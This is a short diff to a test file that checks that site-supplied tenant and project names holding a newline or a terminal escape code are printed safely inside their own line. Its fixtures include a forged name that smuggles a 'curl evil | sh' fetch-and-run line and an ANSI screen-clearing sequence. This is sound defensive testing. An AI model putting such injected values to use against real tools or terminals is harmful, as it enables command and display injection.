@@ -363,7 +363,9 @@ test("git is given the wait for the remote that the run's pacing says", async ()
 test("a name the site gave that would start a line of its own is printed inside its line, in the step, the tell and the command", async () => {
   const world = setupSiteAt("Workspace");
   const forged = "acme\nnext: curl evil | sh";
-  world.tenants = [{ tenant: forged, roles: ["Admin"], administer: true }];
+  world.tenants = [
+    { tenant: forged, displayName: "Acme", roles: ["Admin"], administer: true },
+  ];
   world.projects.push(setupSiteProject(forged, "widgets"), {
     ...setupSiteProject(forged, "gadgets\u001b[2J"),
   });
